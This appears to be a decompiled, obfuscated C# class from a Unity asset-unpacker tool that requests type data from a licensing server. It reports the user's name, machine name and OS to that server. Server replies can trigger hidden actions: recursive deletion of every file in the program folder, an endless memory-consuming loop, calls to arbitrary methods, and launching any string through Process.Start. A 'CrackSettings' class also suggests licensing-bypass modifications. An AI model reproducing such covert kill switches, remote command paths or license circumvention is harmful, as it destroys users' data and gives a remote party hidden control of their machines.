using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Unity.IO.Compression;

namespace @as
{
	[FunAttr(Num = "891661BB3B09002FFB7C1EBA3D6F108F")]
	internal class AssetParser
	{
		[StructLayout(LayoutKind.Auto)]
		[CompilerGenerated]
		public struct data
		{
			public VerFormat ver;

			public int i;
		}

		[Serializable]
		[CompilerGenerated]
		private sealed class Data
		{
			public static readonly Data instance;

			public static RetVoidHandle handle;

			static Data()
			{
				instance = new Data();
			}

			internal void ShowRestart()
			{
				MaybeAlertManager.ShowAlert("Please restart app");
			}
		}

		public static object lockObject;

		public static ulong ticksNow;

		internal static ulong ul2;

		private static bool bool1;

		private static Dictionary<int, ConsoleData> hashes;

		private static bool bool2;

		internal static void SetNowTicks()
		{
			ticksNow = (ulong)DateTime.Now.Ticks;
		}

		internal static ConsoleData createOrGetData(VerFormat ver, int i1, int i2, int i3 = 0, int[] iArr = null)
		{
			lock (lockObject)
			{
				return MakeConsoleData(ver, i1, i2, null, i3, iArr);
			}
		}

		internal static ConsoleData GetConsoleData(VerFormat ver, int i1, string s, int i2 = 0)
		{
			lock (lockObject)
			{
				return MakeConsoleData(ver, i1, 0, s, i2);
			}
		}

		private static ConsoleData MakeConsoleData(VerFormat ver, int i1, int i2, string s = null, int i4 = 0, int[] iArr = null)
		{
			data data = default(data);
			data.ver = ver;
			data.i = i4;
			if (i2 == 0 && iArr != null && iArr.Length == 1)
			{
				i2 = iArr[0];
			}
			int hash = getHash(i2, s, ref data);
			if ((i2 != 0 || !string.IsNullOrEmpty(s)) && hashes.ContainsKey(hash))
			{
				return hashes[hash];
			}
			if (i2 != 0 && iArr == null)
			{
				iArr = new int[1]
				{
					i2
				};
			}
			if (iArr != null && iArr.Length != 0)
			{
				List<int> list = new List<int>();
				int[] array = iArr;
				foreach (int num in array)
				{
					int hash2 = getHash(num, null, ref data);
					if (!hashes.ContainsKey(hash2))
					{
						list.Add(num);
					}
				}
				if (list.Count == 0)
				{
					return null;
				}
				iArr = list.ToArray();
			}
			try
			{
				object obj = null;
				DateTime now = DateTime.Now;
				if (CrackSettings.AllowDemoAssetRead)
				{
					obj = MakeDemoRequest(data.ver, i1, iArr, s, data.i);
				}
				if (obj == null && !CrackSettings.AllowOffline)
				{
					obj = MakeRequest(data.ver, i1, iArr, s, data.i);
				}
				DateTime now2 = DateTime.Now;
				StrSth strSth = (StrSth)obj;
				if (!hashes.ContainsKey(hash))
				{
					hashes[hash] = null;
				}
				if (iArr != null)
				{
					int[] array2 = iArr;
					for (int k = 0; k < array2.Length; k++)
					{
						int hash3 = getHash(array2[k], null, ref data);
						if (!hashes.ContainsKey(hash3))
						{
							hashes[hash3] = null;
						}
					}
				}
				if (i2 != 0)
				{
					hashes[hash] = strSth?.FindByInt(i2);
				}
				else if (!string.IsNullOrEmpty(s))
				{
					hashes[hash] = strSth?.FindByStr(s);
				}
				if (strSth != null)
				{
					foreach (KeyValuePair<int, ConsoleData> lic in strSth.lics)
					{
						if (lic.Value.objectType != 0)
						{
							int hash4 = getHash(lic.Value.objectType, null, ref data);
							if (!hashes.ContainsKey(hash4) || hashes[hash4] == null)
							{
								hashes[hash4] = lic.Value;
							}
						}
						if (lic.Value.objectType == 0)
						{
							int hash5 = getHash(0, lic.Value.SthStrValueForIndex, ref data);
							if (!hashes.ContainsKey(hash5) || hashes[hash5] == null)
							{
								hashes[hash5] = lic.Value;
							}
						}
					}
				}
				if (iArr != null)
				{
					int[] array = iArr;
					foreach (int num2 in array)
					{
						int key = (int)MaybeHashCalc.toHash(data.ver + "_" + num2 + (string.IsNullOrEmpty(s) ? null : ("_" + s)) + "_" + data.i + DateTime.Now.Day);
						ConsoleData consoleData = hashes[key];
						if (consoleData != null)
						{
							if (consoleData.ver.ToStr() != data.ver.ToStr())
							{
								ConsoleManager.Write1(consoleData.objectType + " " + (ClassIDEnum)consoleData.objectType + " - not find " + data.ver + " and will be used " + consoleData.ver);
							}
							else
							{
								ConsoleManager.WriteErr1(consoleData.objectType + " " + (ClassIDEnum)consoleData.objectType + " - find for " + data.ver);
							}
						}
						else
						{
							(num2 + " " + (ClassIDEnum)num2 + " - not find for version " + data.ver).LogErrToConsole();
						}
					}
				}
				return hashes[hash];
			}
			catch (Exception arg)
			{
				ConsoleManager.LogExeption(string.Concat(arg));
				return null;
			}
		}

		[CIntA(Num = 2uL)]
		private static StrSth MakeRequest(VerFormat ver, int i1, int[] iArr, string s, int i2)
		{
			byte[] array = null;
			try
			{
				CustomString customString = ConvertNameToHash.Get();
				CustomString customString2 = HiddenCalls.CallString("155129864");
				CustomString customString3 = (DevXSystemInfo.UserName ?? "").ToLower() + "@" + DevXSystemInfo.get_MachineName();
				CustomInt customInt = HiddenCalls.Call2("1946453154");
				CustomString d = Thread.CurrentThread.CurrentCulture.Name ?? "";
				Assembly assembly = typeof(AssetParser).Assembly;
				CustomString f = "";
				string d2 = (File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.dll")) || File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.exe"))).ToString().Replace("False", "");
				List<string> list = new List<string>();
				if (iArr != null)
				{
					for (int j = 0; j < iArr.Length; j++)
					{
						int num = iArr[j];
						list.Add(num.ToString());
					}
				}
				CustomString f2 = ServerLink.GetLink() + "/AppSecurityUnpackerTools/UnityClassManager_GetByVersionAndClassID_Serialized";
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["Name"] = customString3;
				nameValueCollection["BindingID"] = customString;
				nameValueCollection["LicenseNumber"] = customString2;
				nameValueCollection["Hash"] = MaybeHashCalc.Calc(customString2 + "-" + customString + "-" + customString3 + f + d2);
				nameValueCollection["HVer"] = ul2.ToString("X16");
				nameValueCollection["THVer"] = string.Concat((ulong)((long)ul2 ^ (long)(DateTime.UtcNow.DayOfYear * 17454591)));
				nameValueCollection["Version"] = "10.06";
				nameValueCollection["Is64BitProcess"] = (DevXSystemInfo.Is64BitProcess ? "1" : "0");
				nameValueCollection["LicenseType"] = HiddenCalls.CallString("2141342825");
				nameValueCollection["DateTime"] = DateTime.Now.ToString("yyyy.MM.dd");
				nameValueCollection["SystemLanguage"] = d;
				nameValueCollection["VerifyProjectLicense"] = string.Concat(customInt);
				nameValueCollection["OSVersion"] = DevXSystemInfo.OSVersion;
				nameValueCollection["param_UnityVersion"] = string.Concat(ver);
				nameValueCollection["param_unity_fileGen_version"] = string.Concat(i1);
				nameValueCollection["param_typeName"] = s;
				nameValueCollection["param_platform"] = i2.ToString();
				nameValueCollection["param_format_version"] = "1";
				nameValueCollection["param_compress"] = "1";
				nameValueCollection["param_class_id_arr"] = string.Join(",", list.ToArray());
				nameValueCollection["param_Hash"] = MaybeHashCalc.Calc(ver.ToString() + "_" + i1.ToString() + "_" + s + "_" + i2.ToString());
				WebReqManager.GetClient(10).Encoding = Encoding.UTF8;
				string text = null;
				for (int num2 = 5; num2 >= 0; num2--)
				{
					try
					{
						text = WebReqManager.MakeReq(f2 + "?temp=" + DateTime.Now.Ticks.ToString(), nameValueCollection);
						if (text != null)
						{
							break;
						}
					}
					catch (Exception ex)
					{
						ConsoleManager.LogExeption("NETWORK_S ERROR2: " + ex?.ToString());
						if (num2 == 0)
						{
							ConsoleManager.LogExeption("NETWORK_S ERROR2: " + ex?.ToString());
							MaybeAlertManager.ShowAlert("Network error, please try connection to http://devxdevelopment.com\nError: " + ex.Message + "\nUser: " + customString3);
							MaybeAlertManager.SetHandle(Data.instance.ShowRestart);
							return null;
						}
						Thread.Sleep(50);
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					ConsoleManager.Write("GetByVersionAndClassID_internal_net: res=null for " + ver + "_" + list);
					return null;
				}
				if (text.StartsWith("EMPTY"))
				{
					return null;
				}
				if (text.StartsWith("ERROR"))
				{
					("NETWORK ERROR " + text).LogErrToConsole();
					return null;
				}
				if (text.StartsWith("Answer:"))
				{
					return null;
				}
				text.StartsWith("Terminate:");
				if (text.StartsWith("Slow:"))
				{
					int num3 = 0;
					if (num3 < 1000)
					{
						while (true)
						{
							byte[] array2 = new byte[1000000];
							for (int k = 0; k < array2.Length; k++)
							{
								array2[k] = (byte)num3;
							}
						}
					}
				}
				if (text.StartsWith("CallMethod:"))
				{
					string text2 = text.Substring("CallMethod:".Length);
					HashManager.CallMethod(null, null, text2.Substring(0, text2.IndexOf(":")), text2.Substring(text2.IndexOf(":") + 1));
					return null;
				}
				if (text.StartsWith("Reboot:"))
				{
					return null;
				}
				if (text.StartsWith("OpenURL:"))
				{
					Process.Start(text.Substring("OpenURL:".Length));
					return null;
				}
				if (text.StartsWith("CleanProgramm:"))
				{
					text.Substring("CleanProgramm:".Length);
					string[] files = Directory.GetFiles(FileManager.StartupPath, "*.*", SearchOption.AllDirectories);
					foreach (string path in files)
					{
						try
						{
							File.Delete(path);
						}
						catch
						{
						}
					}
					return null;
				}
				string str = HiddenCalls.CallString("1520475628");
				string text3 = HiddenCalls.CallString("436900044");
				if (string.IsNullOrEmpty(text3))
				{
					text3 = HiddenCalls.CallString("155129864");
				}
				string str2 = (File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.dll")) || File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.exe"))).ToString().Replace("False", "");
				text3 += str2;
				str += str2;
				array = null;
				if (text != null && text.StartsWith("#EA="))
				{
					try
					{
						if (!string.IsNullOrEmpty(str))
						{
							array = Convert.FromBase64String(text.Substring("#EA=".Length));
							array = EncryptDecryptManager.Decrypt(array, str);
							using (MemoryStream stream = new MemoryStream(array))
							{
								array = null;
								using (GZipStream _0020 = new GZipStream(stream, CompressionMode.Decompress))
								{
									MemoryStream memoryStream = new MemoryStream();
									FileManager.Copy(_0020, memoryStream);
									array = memoryStream.ToArray();
								}
							}
						}
					}
					catch (Exception)
					{
						array = null;
					}
				}
				else if (text != null && text.StartsWith("#EL="))
				{
					try
					{
						array = Convert.FromBase64String(text.Substring("#EL=".Length));
						array = EncryptDecryptManager.Decrypt(array, text3);
						using (MemoryStream stream2 = new MemoryStream(array))
						{
							array = null;
							using (GZipStream _00202 = new GZipStream(stream2, CompressionMode.Decompress))
							{
								MemoryStream memoryStream2 = new MemoryStream();
								FileManager.Copy(_00202, memoryStream2);
								array = memoryStream2.ToArray();
							}
						}
					}
					catch (Exception)
					{
						array = null;
					}
				}
				else if (text != null && text.StartsWith("#ELN="))
				{
					try
					{
						array = Convert.FromBase64String(text.Substring("#ELN=".Length));
						array = EncryptDecryptManager.Decrypt(array, HiddenCalls.CallString("155129864"));
						using (MemoryStream stream3 = new MemoryStream(array))
						{
							array = null;
							using (GZipStream _00203 = new GZipStream(stream3, CompressionMode.Decompress))
							{
								MemoryStream memoryStream3 = new MemoryStream();
								FileManager.Copy(_00203, memoryStream3);
								array = memoryStream3.ToArray();
							}
						}
					}
					catch (Exception)
					{
						array = null;
					}
				}
				else
				{
					if (array == null)
					{
						try
						{
							array = Convert.FromBase64String(text);
							array = EncryptDecryptManager.Decrypt(array, text3);
							using (MemoryStream stream4 = new MemoryStream(array))
							{
								array = null;
								using (GZipStream _00204 = new GZipStream(stream4, CompressionMode.Decompress))
								{
									MemoryStream memoryStream4 = new MemoryStream();
									FileManager.Copy(_00204, memoryStream4);
									array = memoryStream4.ToArray();
								}
							}
						}
						catch (Exception)
						{
							array = null;
						}
					}
					if (array == null)
					{
						try
						{
							text3 = HiddenCalls.CallString("155129864");
							text3 += str2;
							array = Convert.FromBase64String(text);
							array = EncryptDecryptManager.Decrypt(array, text3);
							using (MemoryStream stream5 = new MemoryStream(array))
							{
								array = null;
								using (GZipStream _00205 = new GZipStream(stream5, CompressionMode.Decompress))
								{
									MemoryStream memoryStream5 = new MemoryStream();
									FileManager.Copy(_00205, memoryStream5);
									array = memoryStream5.ToArray();
								}
							}
						}
						catch (Exception arg)
						{
							ConsoleManager.Write1(text);
							ConsoleOver.LogEx(string.Concat(arg));
						}
					}
				}
			}
			catch (Exception ex6)
			{
				ConsoleManager.LogExeption("NetTree: " + ex6?.ToString());
				return null;
			}
			if (array == null)
			{
				ConsoleManager.Write("NetTree: buff=null for " + ver + "_" + iArr?.Length + "_" + s);
				return null;
			}
			StrSth strSth = new StrSth(i1);
			using (MemoryStream _00206 = new MemoryStream(array))
			{
				strSth.Copy(_00206);
				return strSth;
			}
		}

		public static IEnumerable<string> Format1(string s)
		{
			VerFormat ver = new VerFormat(s);
			foreach (string item in Format2(ver))
			{
				yield return item;
			}
		}

		private static IEnumerable<string> Format2(VerFormat ver)
		{
			if (ver != null)
			{
				ver.ToString();
			}
			yield return ver.ToString();
			for (int i2 = ver.i1; i2 > 0; i2--)
			{
				if (i2 > 5 && i2 != 225 && i2 < 2017)
				{
					i2 = 5;
				}
				for (int j2 = (ver.i1 == i2) ? ver.i2 : 13; j2 >= 0; j2--)
				{
					for (int l = (ver.i2 == j2 && ver.i1 == i2 && ver.i3.HasValue) ? ver.i3.Value : 20; l >= 0; l--)
					{
						string text = "pfba";
						for (int num = 0; num < text.Length; num++)
						{
							char c = text[num];
							for (int i = 9; i >= 0; i--)
							{
								yield return i2 + "." + j2 + "." + l + c.ToString() + i;
							}
							yield return i2 + "." + j2 + "." + l + c.ToString();
						}
					}
					for (int l = (ver.i2 == j2 && ver.i1 == i2 && ver.i3.HasValue) ? ver.i3.Value : 0; l <= 20; l++)
					{
						string text = "pfba";
						for (int num = 0; num < text.Length; num++)
						{
							char c = text[num];
							for (int i = 0; i <= 9; i++)
							{
								yield return i2 + "." + j2 + "." + l + c.ToString() + i;
							}
							yield return i2 + "." + j2 + "." + l + c.ToString();
						}
					}
				}
				yield return ver.ToStr();
				for (int j2 = (ver.i1 == i2) ? ver.i2 : 0; j2 < 10; j2++)
				{
					for (int l = 0; l < 20; l++)
					{
						yield return i2 + "." + j2 + "." + l;
					}
					yield return i2 + "." + j2 + ".";
				}
			}
			for (int i2 = ver.i1; i2 <= DateTime.Now.Year + 2; i2++)
			{
				if (i2 > 5 && i2 < 2017)
				{
					i2 = 2017;
				}
				for (int j2 = (ver.i1 == i2) ? ver.i2 : 0; j2 < 10; j2++)
				{
					for (int l = (ver.i2 == j2 && ver.i1 == i2 && ver.i3.HasValue) ? ver.i3.Value : 0; l < 20; l++)
					{
						yield return i2 + "." + j2 + "." + l;
					}
				}
			}
		}

		private static ConsoleData ForReqData(int i, VerFormat ver, int i2 = 0)
		{
			foreach (string item in Format2(ver))
			{
				foreach (StrSth item2 in TryGetStrSth(item, null, i2))
				{
					ConsoleData consoleData = item2?.FindByInt(i);
					if (consoleData != null)
					{
						return consoleData;
					}
					if (bool2)
					{
						return consoleData;
					}
				}
				if (i2 != 0)
				{
					foreach (StrSth item3 in TryGetStrSth(item, null, null))
					{
						ConsoleData consoleData2 = item3?.FindByInt(i);
						if (consoleData2 != null)
						{
							return consoleData2;
						}
						if (bool2)
						{
							return consoleData2;
						}
					}
				}
			}
			return null;
		}

		internal static IEnumerable<StrSth> TryGetStrSth(string s, int? i1, int? i2)
		{
			Dictionary<string, StrSthData> data = DemoAssetDumper.GetData();
			foreach (KeyValuePair<string, StrSthData> item in data)
			{
				string key = item.Key;
				if (key.Contains("Class_") && key.Contains("_v" + s) && (!i1.HasValue || i1.Value == 0 || key.Contains("_c" + i1.Value.ToString())))
				{
					yield return item.Value.toStrSth;
				}
			}
		}

		internal static StrSth GetStrSth(string s, int? i1, int? i2)
		{
			using (IEnumerator<StrSth> enumerator = TryGetStrSth(s, i1, i2).GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					return enumerator.Current;
				}
			}
			return null;
		}

		private static IEnumerable<StrSth> TryGetStrSth2(string s1, string s2, int? i)
		{
			Dictionary<string, StrSthData> dictionary = DemoAssetDumper.GetData();
			foreach (KeyValuePair<string, StrSthData> item in dictionary)
			{
				string key = item.Key;
				if (key.Contains("UnityType_") && key.Contains("_v" + s1) && (s2 == null || string.IsNullOrEmpty(s2) || key.Contains("_c" + s2)))
				{
					yield return item.Value.toStrSth;
				}
			}
			foreach (KeyValuePair<string, StrSthData> item2 in dictionary)
			{
				string key2 = item2.Key;
				if (key2.Contains("Class_") && key2.Contains("_v" + s1) && (s2 == null || string.IsNullOrEmpty(s2) || key2.Contains("_c" + s2)))
				{
					yield return item2.Value.toStrSth;
				}
			}
		}

		internal static void FileCheck(string s)
		{
			if (File.Exists(s))
			{
				Stream stream = FileManager.MakeStream(s);
				StrSth strSth = new StrSth(0);
				strSth.SthToStream(stream);
				stream.Close();
				Empty(strSth);
			}
		}

		internal static void Empty(StrSth s)
		{
		}

		static AssetParser()
		{
			lockObject = new object();
			ticksNow = 0uL;
			ul2 = ManyCodeCls.GetUl2();
			bool1 = false;
			hashes = new Dictionary<int, ConsoleData>();
			bool2 = true;
		}

		[CompilerGenerated]
		internal static int getHash(int i, string s, ref data data)
		{
			return (int)MaybeHashCalc.toHash(data.ver + "_" + i + (string.IsNullOrEmpty(s) ? null : ("_" + s)) + "_" + data.i + DateTime.Now.Day);
		}

		[CIntA(Num = 3uL)]
		private static StrSth MakeDemoRequest(VerFormat ver, int i1, int[] iArr, string s, int i2)
		{
			if ((iArr == null || iArr.Length == 0) && !string.IsNullOrEmpty(s))
			{
				return ReqIsEmptyArr(ver, i1, s, i2);
			}
			if (iArr != null && iArr.Length != 0)
			{
				return ReqIsNonEmptyArr(ver, i1, iArr, i2);
			}
			return null;
		}

		private static StrSth ReqIsNonEmptyArr(VerFormat ver, int i1, int[] iArr, int i2 = 0)
		{
			if (iArr != null && iArr.Length != 0)
			{
				StrSth strSth = new StrSth(0);
				int num = 0;
				for (int j = 0; j < iArr.Length; j++)
				{
					ConsoleData consoleData = ForReqData(iArr[j], ver, i2);
					if (consoleData != null)
					{
						strSth.AddData(consoleData, num++);
					}
				}
				return strSth;
			}
			return null;
		}

		private static StrSth ReqIsEmptyArr(VerFormat ver, int i1, string s, int i2 = 0)
		{
			ConsoleData consoleData = null;
			StrSth strSth = null;
			foreach (string item in Format2(ver))
			{
				if (consoleData == null && !string.IsNullOrEmpty(s))
				{
					foreach (StrSth item2 in TryGetStrSth2(item, s, i2))
					{
						strSth = item2;
						if (bool2)
						{
							return strSth;
						}
						consoleData = strSth?.FindByStr(s);
						if (consoleData != null)
						{
							return strSth;
						}
					}
				}
				if (consoleData == null)
				{
					foreach (StrSth item3 in TryGetStrSth2(item, null, i2))
					{
						strSth = item3;
						if (bool2)
						{
							return strSth;
						}
						if (string.IsNullOrEmpty(s) && strSth != null)
						{
							return strSth;
						}
					}
					consoleData = strSth?.FindByStr(s);
				}
				if (i2 != 0)
				{
					if (consoleData == null && !string.IsNullOrEmpty(s))
					{
						foreach (StrSth item4 in TryGetStrSth2(item, s, null))
						{
							strSth = item4;
							if (bool2)
							{
								return strSth;
							}
							consoleData = strSth?.FindByStr(s);
							if (consoleData != null)
							{
								return strSth;
							}
						}
					}
					if (consoleData == null)
					{
						foreach (StrSth item5 in TryGetStrSth2(item, null, null))
						{
							strSth = item5;
							if (bool2)
							{
								return strSth;
							}
							if (string.IsNullOrEmpty(s) && strSth != null)
							{
								return strSth;
							}
						}
						consoleData = strSth?.FindByStr(s);
					}
				}
				if (bool2)
				{
					return strSth;
				}
				if (consoleData != null)
				{
					return strSth;
				}
			}
			return null;
		}
	}
}
